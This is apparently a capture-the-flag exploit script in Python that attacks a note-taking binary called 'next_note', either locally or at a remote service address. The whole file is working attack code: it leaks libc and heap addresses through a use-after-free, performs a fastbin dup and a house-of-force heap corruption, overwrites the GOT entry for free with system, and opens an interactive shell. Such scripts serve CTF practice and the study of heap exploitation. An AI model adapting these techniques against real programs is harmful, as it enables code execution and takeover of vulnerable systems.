#!/usr/bin/env python
from sc_expwn import *  # https://github.com/shift-crops/sc_expwn/blob/master/sc_expwn.py

bin_file = './next_note'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'172.20.2.2', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = './libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_free       = binf.got['free']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    note = Note(conn)

    note.add(0x80, 'X'*4)
    note.add(0x28, 'Y'*4)
    note.add(0x28, 'Z'*4)
    note.remove(0)
    note.remove(1)
    note.remove(2)

    # use after free
    addrs = note.show()
    libc.address    = u(addrs[0]) - (offset_libc_mainarena + 0x58)
    info('addr_libc   = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    addr_heap       = u(addrs[2]) - 0x90
    info('addr_heap   = 0x{:08x}'.format(addr_heap))

    # fastbin dup
    note.remove(1)

    note.add(0x28, p64(addr_heap+0xe0))
    note.add(0x28, p64(0)*3 + p64(0x31))
    note.add(0x28, p64(0xdeadbeef))
    note.add(0x28, p64(0) + p(-1))

    note.add(0x80, 'X'*4)

    # house of force / GOT over write
    note.add((addr_got_free & ~(0x10 - 1)) - (addr_heap + 0xf0) - 0x10*2, None)
    note.add(0x60, p64(0) + p64(addr_libc_system)[:-1])
   
class Note:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendafter      = conn.sendafter

    def add(self, size, data):
        self.sendafter('>> ', '1')

        self.sendafter('...', str(size))
        if data:
            self.sendafter('...', data)

    def show(self):
        self.sendafter('>> ', '2')

        self.recvuntil('SHOW NOTES\n')
        return [s.split(' : ')[1] for s in self.recvuntil('done.').split('\n')[:-1]]

    def remove(self, n):
        self.sendafter('>> ', '3')

        self.sendafter('...', str(n))

    def exit(self):
        self.sendafter('>> ', '0')

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
